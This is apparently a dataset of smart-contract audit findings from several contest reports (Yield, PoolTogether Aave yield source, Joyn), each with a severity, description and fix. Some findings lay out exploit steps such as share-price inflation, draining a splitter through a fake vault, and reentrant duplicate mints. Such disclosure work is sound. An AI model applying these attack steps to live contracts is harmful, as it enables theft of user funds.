25.md,`updateTime` of get is 0,low,"In function `_get` of `CompositeMultiOracle` the `updateTime` is not initialized, so it will be 0.

Function `_get` has the following statement:
```solidity
   updateTimeOut = (updateTimeOut < updateTimeIn) ? updateTimeOut : updateTimeIn;

updateTimeIn ==0 ==>  (updateTimeOut < updateTimeIn)== false ==> result of the expression is updateTimeIn == 0 ==> updateTimeOut =0
```

So this means the function get will always return `updateTime==0`

The `updateTime` result of the function `get` doesn't seem to be used in the code so the risk is low. If would only be relevant for future code updates.

```solidity
// https://github.com/code-423n4/2021-08-yield/blob/main/contracts/oracles/composite/CompositeMultiOracle.sol#L94
function get(bytes32 base, bytes32 quote, uint256 amount)  external virtual override  returns (uint256 value, uint256 updateTime)  {
...
for (uint256 p = 0; p < path.length; p++) {
  (price, updateTime) = _get(base_, path[p], price, updateTime);

function _get(bytes6 base, bytes6 quote, uint256 priceIn, uint256 updateTimeIn)  private returns (uint priceOut, uint updateTimeOut) {
...
  (priceOut, updateTimeOut) = IOracle(source.source).get(base, quote, 10 ** source.decimals);    // Get price for one unit
  ...
  updateTimeOut = (updateTimeOut < updateTimeIn) ? updateTimeOut : updateTimeIn;                 // Take the oldest update time
}
```

Recommend adding the following in the beginning of the `_get` function:
`updateTime = block.timestamp;`"
25.md,Different definition of `beforeMaturity()` and `afterMaturity()` modifier in different file,low,"Different definition of `beforeMaturity()` and `afterMaturity()` modifier in [`Strategy.sol` L82](https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/yieldspace/Strategy.sol#L82) and [`FYToken.sol` L65](https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/FYToken.sol#L65) which used `FYTokenFacory()`. See issue page for further elaboration.

See issue page for more."
25.md,Missing input validation to check that `end` > `start`,low,"`setRewards()` is missing input validation on parameters `start` and `end` to check if `end` > `start`. If accidentally set incorrectly, this will allow resetting new rewards while there is an ongoing one ([`ERC20Rewards.sol#L74` L88](https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/utils/token/ERC20Rewards.sol#L74-L88)).

Recommend adding a `require()` to check that `end` > `start`."
25.md,Upgrading solc compiler version may help with bug fixes,low,"solc version 0.8.3 and 0.8.4 fixed important bugs in the compiler. Using version 0.8.1 misses these fixes and may cause a vulnerability.

See [`ERC20Rewards.sol` L2](https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/utils/token/ERC20Rewards.sol#L2).
[Solidity 0.8.4](https://github.com/ethereum/solidity/releases/tag/v0.8.4) fixes a bug in the ABI decoder. The release contains an important bugfix. See decoding from memory bug blog post for more details.

[Solidity 0.8.3](https://github.com/ethereum/solidity/releases/tag/v0.8.3) is a bugfix release that fixes an important bug about how the optimizer handles the Keccak256 opcode. For details on the bug, please see the bug blog post.

Recommend considering upgrading to 0.8.3 or 0.8.4."
25.md,Missing emits for events,low,"Few events are missing emits which prevents the intended data from being observed easily by off-chain interfaces ([`Strategy.sol#L48` L49](https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/yieldspace/Strategy.sol#L48-L49)).

Recommend adding emits or remove event declarations."
25.md,Unused `cauldron_` parameter,low,"That `cauldron_` parameter is not used here and `ladle_.cauldron()` is used instead. The `Ladle` constructor initializes its cauldron value and so the only way this could differ from the parameter is if the argument to this function is specified incorrectly. See issue page for referenced code.

Recommend either using parameter, or remove it in favor of the value from `ladle_.cauldron()`."
25.md,Missing check for contract existence,low,"Low-level call returns success even if the contract is non-existent. This requires a contract existence check before making the low-level call ([`TimeLock.sol` L93](https://github.com/code-423n4/2021-08-yield/blob/4dc46470e616dd0cbd9db9b4742e36c4d809e02c/contracts/utils/TimeLock.sol#L93)).


See: “The low-level functions call, `delegatecall` and `staticcall` return true as their first return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed.” from https://docs.soliditylang.org/en/v0.8.7/control-structures.html#error-handling-assert-require-revert-and-exceptions

Recommend checking for target contract existence before call."
25.md,`_peek` does not work for tokens with > 18 decimals,low,"The `CTokenMultiOracle._peek/_get` function does the following computation on unsigned integers which reverts when `source.decimals > 18`:

```solidity
price = uint(rawPrice) * 10 ** (18 - source.decimals);
```

Recommend instead performing this `price = uint(rawPrice) * 10 ** 18 / 10 ** source.decimals;`.
Note that this leads to a loss of precision and the price could end up being `0`."
25.md,`ERC20Rewards` claiming can fail if no reward tokens,low,"The `ERC20Rewards` contract assumes that enough `rewardsToken` are in the contract to pay out when `claim` is called but this value is never checked and claiming rewards can fail.

Recommend that, when setting new rewards periods, to make sure that enough `rewardsToken`s are in the contract to cover the entire period."
25.md,improve safety of role constants,low,"The contract `Wand` defines a few role constants with `bytes4(keccak256(""...function...""))`
However if the function template would change slightly, for example when `uint128` is replaced by `uint256`, then this construction isn't valid anymore.

It is safer to use the function selector, as is done in [`EmergencyBrake.sol`](https://github.com/code-423n4/2021-08-yield/blob/main/contracts/Wand.sol#L27)
```solidity
  bytes4 public constant JOIN = bytes4(keccak256(""join(address,uint128)""));
  bytes4 public constant EXIT = bytes4(keccak256(""exit(address,uint128)""));
  bytes4 public constant MINT = bytes4(keccak256(""mint(address,uint256)""));
  bytes4 public constant BURN = bytes4(keccak256(""burn(address,uint256)""));
```

```solidity
// https://github.com/code-423n4/2021-08-yield/blob/main/contracts/utils/EmergencyBrake.sol#L35
  _grantRole(IEmergencyBrake.plan.selector, planner);
```

Recommend using function selectors in `Wand.sol`."
25.md,`EmergencyBrake.sol`: Permissions cannot be re-planned after termination,low,"Given a configuration of target, contacts, and permissions, calling `terminate()`, will permanently prevent this configuration from being used again because the state becomes `State.TERMINATED`. All other functions require the configuration to be in the other states (UNKNOWN, PLANNED, or EXECUTED).

In other words, the removal of the restoring option for the configuration through `EmergencyBrake` is permanent.

Recommend that, since `EmergencyBrake` cannot reinstate permissions after termination, it would be better to have terminate change its state to UNKNOWN. The TERMINATED state can therefore be removed."
25.md,`ERC20Rewards.sol`: Have a method to calculate the latest `rewardsPerToken` accumulated value,low,"This would be equivalent to [Unipool's `rewardPerToken()` function](https://github.com/k06a/Unipool/blob/master/contracts/Unipool.sol#L69). Note that `rewardsPerToken.accumulated` only reflects the latest stored accumulated value, but does not account for pending accumulation like Unipool, and is therefore not the same. It possibly might be mistaken to be so, hence the low risk classification.

A possible implementation is given below.
```jsx
function latestRewardPerToken() external view returns (uint256) {
	RewardsPerToken memory rewardsPerToken_ = rewardsPerToken;
	if (_totalSupply == 0) return rewardsPerToken_.accumulated;
	uint32 end = earliest(block.timestamp.u32(), rewardsPeriod.end);
	uint256 timeSinceLastUpdated = end - rewardsPerToken_.lastUpdated;
	return rewardsPerToken_.accumulated + 1e18 * timeSinceLastUpdated * rewardsPerToken_.rate / _totalSupply;
}
```"
114.md,A malicious early user/attacker can manipulate the vault's `pricePerShare` to take an unfair share of future users' deposits,high,"This is a well-known attack vector for new contracts that utilize pricePerShare for accounting.

[AaveV3YieldSource.sol#L352-L374](https://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L352-L374)<br>

```solidity
  /**
   * @notice Calculates the number of shares that should be minted or burnt when a user deposit or withdraw.
   * @param _tokens Amount of asset tokens
   * @return Number of shares.
   */
  function _tokenToShares(uint256 _tokens) internal view returns (uint256) {
    uint256 _supply = totalSupply();

    // shares = (tokens * totalShares) / yieldSourceATokenTotalSupply
    return _supply == 0 ? _tokens : _tokens.mul(_supply).div(aToken.balanceOf(address(this)));
  }

  /**
   * @notice Calculates the number of asset tokens a user has in the yield source.
   * @param _shares Amount of shares
   * @return Number of asset tokens.
   */
  function _sharesToToken(uint256 _shares) internal view returns (uint256) {
    uint256 _supply = totalSupply();

    // tokens = (shares * yieldSourceATokenTotalSupply) / totalShares
    return _supply == 0 ? _shares : _shares.mul(aToken.balanceOf(address(this))).div(_supply);
  }
```

A malicious early user can `supplyTokenTo()` with `1 wei` of `_underlyingAssetAddress` token as the first depositor of the `AaveV3YieldSource.sol`, and get `1 wei` of shares token.

Then the attacker can send `10000e18 - 1` of `aToken` and inflate the price per share from 1.0000 to an extreme value of 1.0000e22 ( from `(1 + 10000e18 - 1) / 1`) .

As a result, the future user who deposits `19999e18` will only receive `1 wei` (from `19999e18 * 1 / 10000e18`) of shares token.

They will immediately lose `9999e18` or half of their deposits if they `redeemToken()` right after the `supplyTokenTo()`.

[AaveV3YieldSource.sol#L251-L256](https://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L251-L256)<br>

```solidity
  function redeemToken(uint256 _redeemAmount) external override nonReentrant returns (uint256) {
    address _underlyingAssetAddress = _tokenAddress();
    IERC20 _assetToken = IERC20(_underlyingAssetAddress);

    uint256 _shares = _tokenToShares(_redeemAmount);
    _burn(msg.sender, _shares);
    ...
```

Furthermore, after the PPS has been inflated to an extremely high value (`10000e18`), the attacker can also redeem tokens up to `9999e18` for free, (burn `0` shares) due to the precision loss.

### Recommended Mitigation Steps

Consider requiring a minimal amount of share tokens to be minted for the first minter, and send a port of the initial mints as a reserve to the DAO address so that the pricePerShare can be more resistant to manipulation.

Also, consder adding `require(_shares > 0, ""AaveV3YS/shares-gt-zero"");` before `_burn(msg.sender, _shares);`.




***"
114.md,User fund loss in `supplyTokenTo()` because of rounding,medium,"[AaveV3YieldSource.sol#L231-L242](https://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L231-L242)<br>
[AaveV3YieldSource.sol#L357-L362](https://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L357-L362)<br>

When user use `supplyTokenTo()` to deposit his tokens and get `share` in `FeildSource` because of rounding in division user gets lower amount of `share`. for example if token's `_decimal` was `1` and `totalSupply()` was `1000` and `aToken.balanceOf(FieldSource.address)` was `2100` (becasue of profits in `Aave Pool` `balance` is higher than `supply`), then if user deposit `4` token to the contract with `supplyTokenTo()`, contract is going to `mint` only `1` share for that user and if user calls `YeildToken.balanceOf(user)` the return value is going to be `2` and user already lost half of his deposit.<br>
Of course if ` _precision  ` was high this loss is going to be low enough to ignore but in case of low `_precision` and high price `token` and high `balance / supply` ratio this loss is going to be noticeable.

### Proof of Concept

This is the code of `supplyTokenTo()`:

      function supplyTokenTo(uint256 _depositAmount, address _to) external override nonReentrant {
        uint256 _shares = _tokenToShares(_depositAmount);
        require(_shares > 0, ""AaveV3YS/shares-gt-zero"");

        address _underlyingAssetAddress = _tokenAddress();
        IERC20(_underlyingAssetAddress).safeTransferFrom(msg.sender, address(this), _depositAmount);
        _pool().supply(_underlyingAssetAddress, _depositAmount, address(this), REFERRAL_CODE);

        _mint(_to, _shares);

        emit SuppliedTokenTo(msg.sender, _shares, _depositAmount, _to);
      }

which in line: `_shares = _tokenToShares(_depositAmount)` trying to calculated `shares` corresponding to the number of tokens supplied. and then transfer `_depositAmount` from user and `mint` shares amount for user.
the problem is that if user convert `_shares` to token, he is going to receive lower amount because in most cases:

    _depositAmount > _sharesToToken(_tokenToShares(_depositAmount))

and that's because of rounding in division. Value of `_shares` is less than \_depositAmount. so `YeildSource` should only take part of `_depositAmount` that equals to `_sharesToToken(_tokenToShares(_depositAmount))` and mint `_share` for user.

Of course if `_precision` was high and `aToken.balanceOf(FieldSource.address) / totalSupply()` was low, then this amount will be insignificant, but for some cases it can be harmful for users. for example this conditions:

*   `_perecision` is low like 1 or 2.
*   `token` value is very high like BTC.
*   `aToken.balanceOf(FieldSource.address) / totalSupply()` is high due to manipulation or profit in `Aave pool`.

### Tools Used

VIM

### Recommended Mitigation Steps

To resolve this issue this can be done:

      function supplyTokenTo(uint256 _depositAmount, address _to) external override nonReentrant {
        uint256 _shares = _tokenToShares(_depositAmount);
        require(_shares > 0, ""AaveV3YS/shares-gt-zero"");
        
        _depositAmount = _sharesToToken(_shares); // added hero to only take correct amount of user tokens
        address _underlyingAssetAddress = _tokenAddress();
        IERC20(_underlyingAssetAddress).safeTransferFrom(msg.sender, address(this), _depositAmount);
        _pool().supply(_underlyingAssetAddress, _depositAmount, address(this), REFERRAL_CODE);

        _mint(_to, _shares);

        emit SuppliedTokenTo(msg.sender, _shares, _depositAmount, _to);
      }






***"
114.md,`_depositAmount` requires to be updated to contract balance increase,medium,"[AaveV3YieldSource.sol#L231-L242](https://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L231-L242)<br>

Every time transferFrom or transfer function in ERC20 standard is called there is a possibility that underlying smart contract did not transfer the exact amount entered.<br>
It is required to find out contract balance increase/decrease after the transfer.<br>
This pattern also prevents from re-entrancy attack vector.<br>

### Recommended Mitigation Steps

Recommended code:<br>
function supplyTokenTo(uint256 \_depositAmount, address \_to) external override nonReentrant {<br>
uint256 \_shares = \_tokenToShares(\_depositAmount);<br>
require(\_shares > 0, ""AaveV3YS/shares-gt-zero"");<br>

    address _underlyingAssetAddress = _tokenAddress();

    uint256 balanceBefore = IERC20(_underlyingAssetAddress).balanceOf(address(this)); // remembering asset balance before the transfer
    IERC20(_underlyingAssetAddress).safeTransferFrom(msg.sender, address(this), _depositAmount);
    _depositAmount = IERC20(_underlyingAssetAddress).balanceOf(address(this)) - balanceBefore; // updating actual amount to the contract balance increase

    _pool().supply(_underlyingAssetAddress, _depositAmount, address(this), REFERRAL_CODE);

    _mint(_to, _shares);

    emit SuppliedTokenTo(msg.sender, _shares, _depositAmount, _to);

}





***"
114.md,Owner or Managers can rug Aave rewards,medium,"A malicious owner or manager can steal all Aave rewards that are meant for PoolTogether users.

Even if the user is benevolent the fact that there is a rug vector available may [negatively impact the protocol's reputation](https://twitter.com/RugDocIO/status/1411732108029181960).

### Proof of Concept

```solidity
File: contracts/AaveV3YieldSource.sol   #X

275     function claimRewards(address _to) external onlyManagerOrOwner returns (bool) {
276       require(_to != address(0), ""AaveV3YS/payee-not-zero-address"");
277   
278       address[] memory _assets = new address[](1);
279       _assets[0] = address(aToken);
280   
281       (address[] memory _rewardsList, uint256[] memory _claimedAmounts) = rewardsController
282         .claimAllRewards(_assets, _to);
```

[AaveV3YieldSource.sol#L275-L282](https://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L275-L282)<br>

The `claimRewards()` function allows the caller to send the rewards to an arbitrary address.

### Recommended Mitigation Steps

Use a `poolAddressesProviderRegistry`-like contract to determine where the rewards should go, instead of letting an address be passed in




***"
114.md,`RewardsController` Emission Manager Can Authorize Users to Claim on Behalf of the `AaveV3YieldSource` Contract and Siphon Yield,medium,"[aave/RewardsController.sol#L190-L193](https://github.com/aave/aave-v3-periphery/blob/master/contracts/rewards/RewardsController.sol#L190-L193)<br>
[aave/RewardsController.sol#L39-L42](https://github.com/aave/aave-v3-periphery/blob/master/contracts/rewards/RewardsController.sol#L39-L42)<br>
[aave/RewardsController.sol#L133-L143](https://github.com/aave/aave-v3-periphery/blob/master/contracts/rewards/RewardsController.sol#L133-L143)<br>
[AaveV3YieldSource.sol#L275-L286](https://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L275-L286)<br>

The `AaveV3YieldSource` contract allows the manager or owner of the contract to claim rewards from  Aave's rewards controller. However, there is an external dependency on this periphery Aave contract such that the emission manager of the `RewardsController` contract may allows other users to be authorized claimers.

Authorized claimers can claim rewards on behalf of the `AaveV3YieldSource` contract, effectively bypassing any restrictions put in place by this proprietary contract and its `claimRewards()` function. A malicious emissions manager can effectively siphon yield away from the `AaveV3YieldSource` contract and redirect it to them-self.

### Recommended Mitigation Steps

Ensure this is understood and enforce that the `RewardsController` contract is owner by PoolTogether's multisig.




***"
114.md,Yield source does not correctly calculate share conversions,medium,"> The aTokens’ value is pegged to the value of the corresponding supplied asset at a 1:1 ratio and can be safely stored, transferred or traded. All yield collected by the aTokens' reserves are distributed to aToken holders directly by continuously increasing their wallet balance.

<https://docs.aave.com/developers/tokens/atoken>

### Impact

Incorrect share conversions lead to incorrect pricing of assets and loss of principal. aTokens are rebasing tokens, which means that holders of the token have their `balanceof()` increase over time, but each token is still redeemable for exactly one underlying asset. Any formula that does not return one out for one in is incorrect.

### Proof of Concept

```solidity
File: contracts/AaveV3YieldSource.sol   #X

352     /**
353      * @notice Calculates the number of shares that should be minted or burnt when a user deposit or withdraw.
354      * @param _tokens Amount of asset tokens
355      * @return Number of shares.
356      */
357     function _tokenToShares(uint256 _tokens) internal view returns (uint256) {
358       uint256 _supply = totalSupply();
359   
360       // shares = (tokens * totalShares) / yieldSourceATokenTotalSupply
361       return _supply == 0 ? _tokens : _tokens.mul(_supply).div(aToken.balanceOf(address(this)));
362     }
363   
364     /**
365      * @notice Calculates the number of asset tokens a user has in the yield source.
366      * @param _shares Amount of shares
367      * @return Number of asset tokens.
368      */
369     function _sharesToToken(uint256 _shares) internal view returns (uint256) {
370       uint256 _supply = totalSupply();
371   
372       // tokens = (shares * yieldSourceATokenTotalSupply) / totalShares
373       return _supply == 0 ? _shares : _shares.mul(aToken.balanceOf(address(this))).div(_supply);
374     }
```

[AaveV3YieldSource.sol#L352-L374](https://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L352-L374)<br>

The above code is used for both `supplyTokenTo()` and `redeemToken()` and does not return one for one. Consider the following chain of events:

1.  There are no deposits yet
2.  Alice deposits one wBTC, getting back a AaveV3YieldSource share, while the yield source gets the aToken
3.  Some time later a total of one extra wBTC worth of aToken is generated as yield and is in the `balanceOf(this)`
4.  Alice attempts to withdraw her one share but gets zero wBTC, because `(tokens{1} * totalSupply(){1}) / aToken.balanceOf(this){2}` is zero

### Recommended Mitigation Steps

There does not need to be a conversion function - one share must always equal one token.





***"
104.md,ERC20 transferFrom return values not checked,high,"The `transferFrom()` function returns a boolean value indicating success. This parameter needs to be checked to see if the transfer has been successful. Oddly, `transfer()` function calls were checked.

Some tokens like [EURS](https://etherscan.io/address/0xdb25f211ab05b1c97d595516f45794528a807ad8#code) and [BAT](https://etherscan.io/address/0x0d8775f648430679a709e98d2b0cb6250d2887ef#code) will **not** revert if the transfer failed but return `false` instead. Tokens that don't actually perform the transfer and return `false` are still counted as a correct transfer.

### Impact

Users would be able to mint NFTs for free regardless of mint fee if tokens that don’t revert on failed transfers were used.

### Recommended Mitigation Steps

Check the `success` boolean of all `transferFrom()` calls. Alternatively, use OZ’s `SafeERC20`’s `safeTransferFrom()` function.





***"
104.md,Splitter: Anyone can call incrementWindow to steal the tokens in the contract,high,"In general, the Splitter contract's incrementWindow function is only called when tokens are transfer to the contract, ensuring that the number of tokens stored in balanceForWindow is equal to the contract balance.
However, anyone can use a fake RoyaltyVault contract to call the incrementWindow function of the Splitter contract, so that the amount of tokens stored in balanceForWindow is greater than the contract balance, after which the verified user can call the claim or claimForAllWindows functions to steal the tokens in the contract.

        function incrementWindow(uint256 royaltyAmount) public returns (bool) {
            uint256 wethBalance;

            require(
                IRoyaltyVault(msg.sender).supportsInterface(IID_IROYALTY),
                ""Royalty Vault not supported""
            );
            require(
                IRoyaltyVault(msg.sender).getSplitter() == address(this),
                ""Unauthorised to increment window""
            );

            wethBalance = IERC20(splitAsset).balanceOf(address(this));
            require(wethBalance >= royaltyAmount, ""Insufficient funds"");

            require(royaltyAmount > 0, ""No additional funds for window"");
            balanceForWindow.push(royaltyAmount);
            currentWindow += 1;
            emit WindowIncremented(currentWindow, royaltyAmount);
            return true;
        }

### Proof of Concept

<https://github.com/code-423n4/2022-03-joyn/blob/main/splits/contracts/Splitter.sol#L149-L169>


### Recommended Mitigation Steps

Add the onlyRoyaltyVault modifier to the incrementWindow function of the Splitter contract to ensure that only RoyaltyVault contracts with a specific address can call this function.






***"
104.md,DoS: `claimForAllWindows()` May Be Made Unusable By An Attacker,high,"When the value of `currentWindow` is raised sufficiently high `Splitter.claimForAllWindows()` will not be able to be called due to the block gas limit.

`currentWindow` can only ever be incremented and thus will always increase. This value will naturally increase as royalties are paid into the contract.

Furthermore, an attacker can continually increment `currentWindow` by calling `incrementWindow()`. An attacker can impersonate a `IRoyaltyVault` and send 1 WEI worth of WETH to pass the required checks.

### Proof of Concept

Excerpt from `Splitter.claimForAllWindows()` demonstrating the for loop over `currentWindow` that will grow indefinitely.

            for (uint256 i = 0; i < currentWindow; i++) {
                if (!isClaimed(msg.sender, i)) {
                    setClaimed(msg.sender, i);

                    amount += scaleAmountByPercentage(
                        balanceForWindow[i],
                        percentageAllocation
                    );
                }
            }

`Splitter.incrementWindow()` may be called by an attacker increasing `currentWindow`.

        function incrementWindow(uint256 royaltyAmount) public returns (bool) {
            uint256 wethBalance;

            require(
                IRoyaltyVault(msg.sender).supportsInterface(IID_IROYALTY),
                ""Royalty Vault not supported""
            );
            require(
                IRoyaltyVault(msg.sender).getSplitter() == address(this),
                ""Unauthorised to increment window""
            );

            wethBalance = IERC20(splitAsset).balanceOf(address(this));
            require(wethBalance >= royaltyAmount, ""Insufficient funds"");

            require(royaltyAmount > 0, ""No additional funds for window"");
            balanceForWindow.push(royaltyAmount);
            currentWindow += 1;
            emit WindowIncremented(currentWindow, royaltyAmount);
            return true;
        }

### Recommended Mitigation Steps

Consider modifying the function `claimForAllWindows()` to instead claim for range of windows. Pass the function a `startWindow` and `endWindow` and only iterate through windows in that range. Ensure that `endWindow < currentWindow`.






***"
104.md,CoreCollection can be reinitialized,high,"Reinitialization is possible for CoreCollection as `initialize` function sets `initialized` flag, but doesn't control for it, so the function can be rerun multiple times.

Such types of issues tend to be critical as all core variables can be reset this way, for example `payableToken`, which provides a way to retrieve all the contract funds.

However, setting priority to be medium as `initialize` is `onlyOwner`. A run by an external attacker this way is prohibited, but the possibility of owner initiated reset either by mistake or with a malicious intent remains with the same range of system breaking consequences.

### Proof of Concept

`initialize` doesn't control for repetitive runs:

<https://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L87>

### Recommended Mitigation Steps

Add `onlyUnInitialized` modifier to the `initialize` function:

<https://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L46-L49>






***"
104.md,Centralisation RIsk: Owner Of `RoyaltyVault` Can Take All Funds,high,"The owner of `RoyaltyVault` can set `_platformFee` to any arbitrary value (e.g. 100% = 10000) and that share of the contracts balance and future balances will be set to the `platformFeeRecipient` (which is in the owners control) rather than the splitter contract.

As a result the owner can steal the entire contract balance and any future balances avoiding the splitter.

### Proof of Concept

        function setPlatformFee(uint256 _platformFee) external override onlyOwner {
            platformFee = _platformFee;
            emit NewRoyaltyVaultPlatformFee(_platformFee);
        }

### Recommended Mitigation Steps

This issue may be mitigated by add a maximum value for the `_platformFee` say 5% (or some reasonable value based on the needs of the platform).

Also consider calling `sendToSplitter()` before adjusting the `platformFee`. This will only allow the owner to change the fee for future value excluding the current contract balance.

Consider the following code.

        function setPlatformFee(uint256 _platformFee) external override onlyOwner {
            require(_platformFee < MAX_FEE);
            sendToSplitter(); // @audit this will need to be public rather than external
            platformFee = _platformFee;
            emit NewRoyaltyVaultPlatformFee(_platformFee);
        }







***"
104.md,STORAGE COLLISION BETWEEN PROXY AND IMPLEMENTATION (LACK EIP 1967),high,"Storage collision because of lack of EIP1967 could cause conflicts and override sensible variables

### Proof of Concept

    contract CoreProxy is Ownable {
           address private immutable _implement;

When you implement proxies, logic and implementation share the same storage layout.    In order to avoid storage conflicts  EIP1967 was proposed.(<https://eips.ethereum.org/EIPS/eip-1967>)   The idea is to set proxy variables at fixed positions (like  `impl` and `admin` ).

For example, according to the standard,  the slot for for logic address should be

`0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc` (obtained as `bytes32(uint256(keccak256('eip1967.proxy.implementation')) - 1)`  ).

In this case, for example, as you inherits from `Ownable` the variable \_owner is at the first slot and can be overwritten in the implementation.   There is a table at OZ site that explains this scenario more in detail

<https://docs.openzeppelin.com/upgrades-plugins/1.x/proxies>

section  ""Unstructured Storaged Proxies""


### Recommended Mitigation Steps

Consider using EIP1967






***"
104.md,Duplicate NFTs Can Be Minted if `payableToken` Has a Callback Attached to it,high,"<https://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L139-L167>

<https://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/ERC721Payable.sol#L50-L56>

### Impact

The `mintToken()` function is called to mint unique tokens from an `ERC721` collection. This function will either require users to provide a merkle proof to claim an airdropped token or pay a fee in the form of a `payableToken`. However, because the `payableToken` is paid before a token is minted, it may be possible to reenter the `mintToken()` function if there is a callback attached before or after the token transfer. Because `totalSupply()` has not been updated for the new token, a user is able to bypass the `totalSupply() + amount <= maxSupply` check. As a result, if the user mints the last token, they can reenter and mint duplicate NFTs as the way `tokenId` is generated will wrap around to the start again.

### Proof of Concept

For the sake of this example, let's say `startingIndex = 0` and `maxSupply = 100`. `tokenId` is minted according to `((startingIndex + totalSupply()) % maxSupply) + 1`. If we see that a user mints a token where `totalSupply() = maxSupply - 1 = 99` and they reenter the function, then the next token to mint will actually be of index `1` as `totalSupply() % maxSupply = 0`. Calculating the first `tokenId`, we get `((0 + 0) % maxSupply) + 1 = 1` which is a duplicate of our example.

### Recommended Mitigation Steps

Consider adding reentrancy protections to prevent users from abusing this behaviour. It may also be useful to follow the checks-effects pattern such that all external/state changing calls are made at the end.






***"
104.md,Funds cannot be withdrawn in `CoreCollection.withdraw`,high,"The `CoreCollection.withdraw` function uses `payableToken.transferFrom(address(this), msg.sender, amount)` to transfer tokens from the `CoreCollection` contract to the `msg.sender` ( who is the owner of the contract). The usage of `transferFrom` can result in serious issues. In fact, many ERC20 always require that in `transferFrom` `allowance[from][msg.sender] >= amount`, so in this case the call to the `withdraw` function will revert as the `allowance[CoreCollection][CoreCollection] == 0` and therefore the funds cannot ben withdrawn and will be locked forever in the contract.

### Recommendation
Replace `transferFrom` with `transfer`






***"
104.md,ERC20 tokens with no return value will fail to transfer,high,"<https://github.com/code-423n4/2022-03-joyn/blob/main/royalty-vault/contracts/RoyaltyVault.sol#L43-L46>

<https://github.com/code-423n4/2022-03-joyn/blob/main/royalty-vault/contracts/RoyaltyVault.sol#L51-L57>

### Vulnerability details

Although the ERC20 standard suggests that a transfer should return true on success, many tokens are non-compliant in this regard (including high profile, like USDT) . In that case, the .transfer() call here will revert even if the transfer is successful, because solidity will check that the RETURNDATASIZE matches the ERC20 interface.

### Recommendation

Consider using OpenZeppelin’s SafeERC20





***"
104.md,DoS: Attacker May Front-Run `createSplit()` With A `merkleRoot` Causing Future Transactions With The Same `merkleRoot` to Revert,medium,"A `merkleRoot` may only be used once in `createSplit()` since it is used as `salt` to the deployment of a `SplitProxy`.

The result is an attacker may front-run any `createSplit()` transaction in the mem pool and create another `createSplit()` transaction with a higher gas price that uses the same `merkleRoot` but changes the other fields such as the `_collectionContract` or `_splitAsset()`.  The original transaction will revert and the user will not be able to send any more transaction with this `merkleRoot`.

The user would therefore have to generate a new merkle tree with different address, different allocations or a different order of leaves in the tree to create a new merkle root. However, the attack is repeateable and there is no guarantee this new merkle root will be successfully added to a split without the attacker front-running the transaction again.

### Proof of Concept

The excerpt from `createSplitProxy()` shows the `merkleRoot()` being used as a `salt`.

      splitProxy = address(
        new SplitProxy{salt: keccak256(abi.encode(merkleRoot))}()
      );

### Recommended Mitigation Steps

As seems to be the case here if the transaction address does NOT need to be known ahead of time consider removing the `salt` parameter from the contract deployment.

Otherwise, if the transaction address does need to be known ahead of time then consider concatenating `msg.sender` to the `merkleRoot`. e.g.

    splitProxy = address(
        new SplitProxy{salt: keccak256(abi.encode(msg.sender, merkleRoot))}()
      )




***"
104.md,Fixed Amount of Gas Sent in Call May Be Insufficient,medium,"### Impact

The function `attemptETHTransfer()` makes a call with a fixed amount of gas, 30,000. If the receiver is a contract this may be insufficient to process the `receive()` function. As a result the user would be unable to receive funds from this function.

### Proof of Concept

        function attemptETHTransfer(address to, uint256 value)
            private
            returns (bool)
        {
            // Here increase the gas limit a reasonable amount above the default, and try
            // to send ETH to the recipient.
            // NOTE: This might allow the recipient to attempt a limited reentrancy attack.
            (bool success, ) = to.call{value: value, gas: 30000}("""");
            return success;
        }

### Recommended Mitigation Steps

Consider removing the `gas` field to use the default amount and protect from reentrancy by using reentrancy guards and the [check-effects-interaction pattern](https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html). Note this pattern is already applied correctly.






***"
104.md,`RoyaltyVault.sol` is Not Equipped to Handle On-Chain Royalties From Secondary Sales,medium,"<https://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol>

<https://github.com/code-423n4/2022-03-joyn/blob/main/royalty-vault/contracts/RoyaltyVault.sol>

### Impact

The Joyn documentation mentions that Joyn royalty vaults should be equipped to handle revenue generated on a collection's primary and secondary sales. Currently, `CoreCollection.sol` allows the collection owner to receive a fee on each token mint, however, there is no existing implementation which allows the owner of a collection to receive fees on secondary sales.

After discussion with the Joyn team, it appears that this will be gathered from Opensea which does not have an on-chain royalty mechanism. As such, each collection will need to be added manually on Opensea, introducing further centralisation risk. It is also possible for users to avoid paying the secondary fee by using other marketplaces such as Foundation.

### Recommended Mitigation Steps

